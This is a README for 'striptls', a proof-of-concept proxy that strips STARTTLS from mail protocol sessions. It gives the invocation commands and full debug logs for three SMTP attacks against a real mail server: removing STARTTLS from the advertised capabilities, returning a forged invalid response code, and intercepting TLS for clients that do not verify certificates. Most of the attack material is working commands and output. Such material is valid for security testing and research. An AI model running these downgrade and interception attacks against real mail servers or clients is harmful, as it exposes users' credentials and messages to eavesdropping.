# striptls - proxy

poc implementation of STARTTLS stripping attacks

* SMTP
 * SMTP.StripFromCapabilities - server response capability patch
 * SMTP.StripWithInvalidResponseCode - client STARTTLS stripping, invalid response code
 * SMTP.UntrustedIntercept - STARTTLS interception (client and server talking ssl) (requires server.pem in pwd)
 * SMTP.StripWithTemporaryError
 * SMTP.StripWithError

* POP3 (untested)
* IMAP (untested)
* FTP (untested)
* NNTP (untested)
* XMPP (untested)

## Attacks

local smtp-client -> localhost:8825 (proxy) -> mail.gmx.net:25

### Strip STARTTLS from server capabilities

	#> striptls/striptls.py localhost 8825 mail.gmx.net 25 SMTP.StripFromCapabilities
	2016-01-31 15:44:35,000 - INFO     - <Proxy 0x1fe6e70 listen=('localhost', 8825) target=('mail.gmx.net', 25)> ready.
	2016-01-31 15:44:35,000 - INFO     - <RewriteDispatcher attacks={25: set([<class __main__.StripFromCapabilities at 0x01FE77D8>])}>
	2016-01-31 15:44:37,030 - DEBUG    - <ProtocolDetect 0x1fe6f90 is_protocol=PROTO_SMTP len_history=0> - protocol detected (target port)
	2016-01-31 15:44:37,032 - INFO     - <Session 0x1fe6f10> client ('127.0.0.1', 20070) has connected
	2016-01-31 15:44:37,032 - INFO     - <Session 0x1fe6f10> connecting to target ('mail.gmx.net', 25)
	2016-01-31 15:44:39,051 - DEBUG    - <Session 0x1fe6f10> [client] <= [server]          '220 gmx.com (mrgmx003) Nemesis ESMTP Service ready\r\n'
	2016-01-31 15:44:40,335 - DEBUG    - <Session 0x1fe6f10> [client] => [server]          'ehlo [192.168.139.1]\r\n'
	2016-01-31 15:44:40,746 - DEBUG    - <Session 0x1fe6f10> [client] <= [server]          '250-gmx.com Hello [192.168.139.1] [109.126.64.18]\r\n250-SIZE 31457280\r\n250-AUTH LOGIN PLAIN\r\n250 STARTTLS\r\n'
	2016-01-31 15:44:40,746 - DEBUG    - <Session 0x1fe6f10> [client] <= [server][mangled] '250-gmx.com Hello [192.168.139.1] [109.126.64.18]\r\n250-SIZE 31457280\r\n250 AUTH LOGIN PLAIN\r\n'
	2016-01-31 15:44:40,746 - DEBUG    - <Session 0x1fe6f10> [client] => [server]          'mail FROM:<a@b.com> size=10\r\n'
	2016-01-31 15:44:41,292 - DEBUG    - <Session 0x1fe6f10> [client] <= [server]          '530 Authentication required\r\n'
	2016-01-31 15:44:41,292 - DEBUG    - <Session 0x1fe6f10> [client] => [server]          'rset\r\n'
	2016-01-31 15:44:41,605 - DEBUG    - <Session 0x1fe6f10> [client] <= [server]          '250 OK\r\n'
	2016-01-31 15:44:41,612 - WARNING  - <Session 0x1fe6f10> terminated.

### Invalid STARTTLS response code

	#> striptls/striptls.py localhost 8825 mail.gmx.net 25 SMTP.StripWithInvalidResponseCode
	2016-01-31 15:42:40,325 - INFO     - <Proxy 0x1fefe70 listen=('localhost', 8825) target=('mail.gmx.net', 25)> ready.
	2016-01-31 15:42:40,325 - INFO     - <RewriteDispatcher attacks={25: set([<class __main__.StripWithInvalidResponseCode at 0x02010730>])}>
	2016-01-31 15:43:19,755 - DEBUG    - <ProtocolDetect 0x1feff90 is_protocol=PROTO_SMTP len_history=0> - protocol detected (target port)
	2016-01-31 15:43:19,756 - INFO     - <Session 0x1feff10> client ('127.0.0.1', 20061) has connected
	2016-01-31 15:43:19,756 - INFO     - <Session 0x1feff10> connecting to target ('mail.gmx.net', 25)
	2016-01-31 15:43:21,473 - DEBUG    - <Session 0x1feff10> [client] <= [server]          '220 gmx.com (mrgmx003) Nemesis ESMTP Service ready\r\n'
	2016-01-31 15:43:22,395 - DEBUG    - <Session 0x1feff10> [client] => [server]          'ehlo [192.168.139.1]\r\n'
	2016-01-31 15:43:23,019 - DEBUG    - <Session 0x1feff10> [client] <= [server]          '250-gmx.com Hello [192.168.139.1] [109.126.64.18]\r\n250-SIZE 31457280\r\n250-AUTH LOGIN PLAIN\r\n250 STARTTLS\r\n'
	2016-01-31 15:43:23,019 - DEBUG    - <Session 0x1feff10> [client] <= [server][mangled] '250-gmx.com Hello [192.168.139.1] [109.126.64.18]\r\n250-SIZE 31457280\r\n250-AUTH LOGIN PLAIN\r\n250-STARTTLS\r\n250 STARTTLS\r\n'
	2016-01-31 15:43:23,035 - DEBUG    - <Session 0x1feff10> [client] => [server]          'STARTTLS\r\n'
	2016-01-31 15:43:23,035 - DEBUG    - <Session 0x1feff10> [client] <= [server][mangled] '200 STRIPTLS\r\n'
	2016-01-31 15:43:23,035 - DEBUG    - <Session 0x1feff10> [client] => [server][mangled] None
	2016-01-31 15:43:23,035 - DEBUG    - <Session 0x1feff10> [client] => [server]          'mail FROM:<a@b.com> size=10\r\n'
	2016-01-31 15:43:23,160 - DEBUG    - <Session 0x1feff10> [client] <= [server]          '530 Authentication required\r\n'
	2016-01-31 15:43:23,160 - DEBUG    - <Session 0x1feff10> [client] => [server]          'rset\r\n'
	2016-01-31 15:43:23,269 - DEBUG    - <Session 0x1feff10> [client] <= [server]          '250 OK\r\n'
	2016-01-31 15:43:23,285 - WARNING  - <Session 0x1feff10> terminated.


### Untrusted SSL Intercept (for clients not checking server cert trust)

	#> striptls/striptls.py localhost 8825 mail.gmx.net 25 SMTP.UntrustedIntercept
	2016-01-31 15:59:02,417 - INFO     - <Proxy 0x1f468f0 listen=('localhost', 8825) target=('mail.gmx.net', 25)> ready.
	2016-01-31 15:59:02,417 - INFO     - <RewriteDispatcher attacks={25: set([<class __main__.UntrustedIntercept at 0x01F45298>])}>
	2016-01-31 15:59:06,292 - DEBUG    - <ProtocolDetect 0x1f46a10 protocol_id=PROTO_SMTP len_history=0> - protocol detected (target port)
	2016-01-31 15:59:06,293 - INFO     - <Session 0x1f46990> client ('127.0.0.1', 20238) has connected
	2016-01-31 15:59:06,293 - INFO     - <Session 0x1f46990> connecting to target ('mail.gmx.net', 25)
	2016-01-31 15:59:06,561 - DEBUG    - <Session 0x1f46990> [client] <= [server]          '220 gmx.com (mrgmx002) Nemesis ESMTP Service ready\r\n'
	2016-01-31 15:59:07,500 - DEBUG    - <Session 0x1f46990> [client] => [server]          'ehlo [192.168.139.1]\r\n'
	2016-01-31 15:59:07,565 - DEBUG    - <Session 0x1f46990> [client] <= [server]          '250-gmx.com Hello [192.168.139.1] [109.126.64.18]\r\n250-SIZE 31457280\r\n250-AUTH LOGIN PLAIN\r\n250 STARTTLS\r\n'
	2016-01-31 15:59:07,581 - DEBUG    - <Session 0x1f46990> [client] => [server]          'STARTTLS\r\n'
	2016-01-31 15:59:07,581 - DEBUG    - <Session 0x1f46990> [client] <= [server][mangled] '220 Go ahead\r\n'
	2016-01-31 15:59:07,832 - DEBUG    - <Session 0x1f46990> [client] <= [server][mangled] waiting for inbound SSL Handshake
	2016-01-31 15:59:07,832 - DEBUG    - <Session 0x1f46990> [client] => [server]          'STARTTLS\r\n'
	2016-01-31 15:59:07,926 - DEBUG    - <Session 0x1f46990> [client] => [server][mangled] performing outbound SSL handshake
	2016-01-31 15:59:08,219 - DEBUG    - <Session 0x1f46990> [client] => [server][mangled] None
	2016-01-31 15:59:08,219 - DEBUG    - <Session 0x1f46990> [client] => [server]          'ehlo [192.168.139.1]\r\n'
	2016-01-31 15:59:08,312 - DEBUG    - <Session 0x1f46990> [client] <= [server]          '250-gmx.com Hello [192.168.139.1] [109.126.64.18]\r\n250-SIZE 69920427\r\n250 AUTH LOGIN PLAIN\r\n'
	2016-01-31 15:59:08,312 - DEBUG    - <Session 0x1f46990> [client] => [server]          'mail FROM:<a@b.com> size=10\r\n'
	2016-01-31 15:59:08,407 - DEBUG    - <Session 0x1f46990> [client] <= [server]          '530 Authentication required\r\n'
	2016-01-31 15:59:08,407 - DEBUG    - <Session 0x1f46990> [client] => [server]          'rset\r\n'
	2016-01-31 15:59:08,469 - DEBUG    - <Session 0x1f46990> [client] <= [server]          '250 OK\r\n'
	2016-01-31 15:59:08,484 - WARNING  - <Session 0x1f46990> terminated.
